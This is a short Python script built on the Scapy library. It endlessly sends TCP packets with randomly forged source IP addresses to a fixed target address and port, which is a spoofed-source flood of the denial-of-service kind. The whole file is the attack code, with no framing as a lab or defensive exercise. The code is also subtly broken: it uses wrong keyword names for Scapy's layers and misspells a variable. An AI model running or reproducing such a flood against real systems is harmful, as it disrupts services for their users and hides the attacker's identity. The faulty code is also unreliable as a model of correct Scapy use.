import random
from scapy.all import *
target_IP = "10.0.0.2"
source_port = "6553"
i = 1

while True:
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = '.'

   Source_ip = a + dot + b + dot + c + dot + d
   IP1 = IP(source_IP = Source_iP, destination = target_IP)
   TCP1 = TCP(srcport = source_port, dstport = 6553)
   pkt = IP1 / TCP1
   send(pkt,inter = .001)
   print ("packet sent ", i)
   i = i + 1